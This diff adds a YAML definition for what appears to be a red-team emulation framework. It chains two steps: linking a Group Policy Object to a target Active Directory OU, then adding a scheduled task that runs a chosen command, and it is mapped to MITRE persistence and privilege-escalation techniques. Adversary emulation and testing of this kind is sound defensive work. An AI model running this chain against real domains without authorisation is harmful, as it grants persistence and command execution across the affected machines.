@@ -1,0 +1,69 @@
+---
+api_version: 2.0
+uuid: d9e3b2c6-4f8a-5b0d-9c7e-1f6a2d3e8f4b
+name: Link GPO and Abuse with Scheduled Task
+authors:
+  - isaac_fletcher
+description: |
+  This chain TTP performs an end-to-end GPO abuse attack by first linking a GPO to
+  a target OU, then adding a malicious scheduled task to the GPO.
+
+  The attack chain:
+  1. Link the GPO to a target OU using pyGPO
+  2. Add a scheduled task to the GPO using a custom Impacket-based script
+requirements:
+  platforms:
+    - os: linux
+    - os: darwin
+mitre:
+  tactics:
+    - TA0003 Persistence
+    - TA0004 Privilege Escalation
+  techniques:
+    - T1484 Domain or Tenant Policy Modification
+  subtechniques:
+    - T1484.001 Group Policy Modification
+args:
+  - name: domain
+    description: The target Active Directory domain (e.g., contoso.com)
+    default: contoso.local
+  - name: dc
+    description: The Domain Controller IP or hostname to target
+    default: dc01.contoso.local
+  - name: username
+    description: Username for authentication (without domain prefix)
+  - name: password
+    description: Password for authentication
+  - name: gpo_id
+    description: The GPO GUID to link and abuse (e.g., 12345677-ABCD-9876-ABCD-123456789012)
+  - name: target_dn
+    description: The distinguished name of the OU to link the GPO to (e.g., OU=Workstations,DC=contoso,DC=com)
+  - name: command
+    description: Command to execute via the scheduled task
+    default: whoami
+  - name: taskname
+    description: Name of the scheduled task to create
+    default: GPOAbuseTask
+steps:
+  - name: link_gpo
+    description: Link the GPO to the target OU
+    ttp: //privilege-escalation/link-gpo/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      username: "{{ .Args.username }}"
+      password: "{{ .Args.password }}"
+      gpo_id: "{{ .Args.gpo_id }}"
+      target_dn: "{{ .Args.target_dn }}"
+
+  - name: abuse_gpo
+    description: Add a scheduled task to the GPO
+    ttp: //privilege-escalation/add-gpo-scheduled-task/ttp.yaml
+    args:
+      domain: "{{ .Args.domain }}"
+      dc: "{{ .Args.dc }}"
+      username: "{{ .Args.username }}"
+      password: "{{ .Args.password }}"
+      gpo_id: "{{ .Args.gpo_id }}"
+      command: "{{ .Args.command }}"
+      taskname: "{{ .Args.taskname }}"
